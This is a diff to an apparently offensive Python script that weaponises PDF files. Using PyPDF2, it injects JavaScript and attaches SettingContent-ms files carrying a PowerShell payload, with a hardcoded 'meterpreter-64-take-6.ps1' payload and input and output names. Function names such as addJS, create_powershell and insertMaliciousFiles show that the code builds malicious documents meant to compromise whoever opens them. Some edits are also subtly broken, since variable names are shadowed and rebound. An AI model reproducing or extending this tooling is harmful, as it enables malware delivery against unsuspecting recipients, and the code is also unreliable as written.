@@ -3,14 +3,16 @@ import sys
 
 from PyPDF2 import PdfFileWriter, PdfFileReader
 
-
+payload = "meterpreter-64-take-6.ps1"
+output = "new.pdf"
+inp = "also.pdf"
 
 def addJS():
 
     malicious_pdf = PdfFileWriter()
 
     # Open file passed as -i parameter
-    with open(args.input, "rb") as f:
+    with open(inp, "rb") as f:
 
             pdfReader = PdfFileReader(f)
 
@@ -27,7 +29,7 @@ def addJS():
 
             # Create malicious pdf using -o parameter as file name
 
-            output = open(args.output, "wb+")
+            output = open(output, "wb+")
 
             malicious_pdf.write(output)
 
@@ -74,21 +76,22 @@ def create_powershell():
 
 
 def insertMaliciousFiles():
+    
     raw_payload = ""
     # Read contents of payload file
-    with open(args.payload, "rb") as payload:
+    with open(payload, "rb") as payload:
         raw_payload = payload.read()
     
     payload.close()
     # Check if payload is base64 encoded
-    var = isBase64(raw_payload, args.payload)
+    var = isBase64(raw_payload, payload)
     # Create malicious files
     putFile = create_putfile(raw_payload, var)
     psFile = create_powershell()
     files = [putFile, psFile]
     fileNames = ["Payload.SettingContent-ms", "psFile.SettingContent-ms"]
     # Create the files, write to them and then attach them using pdftk
-    malput = [args.output]
+    malput = [output]
     fileNames.append(malput[0])
     for i in range(len(files)):
         tmp = open(fileNames[i], "w")
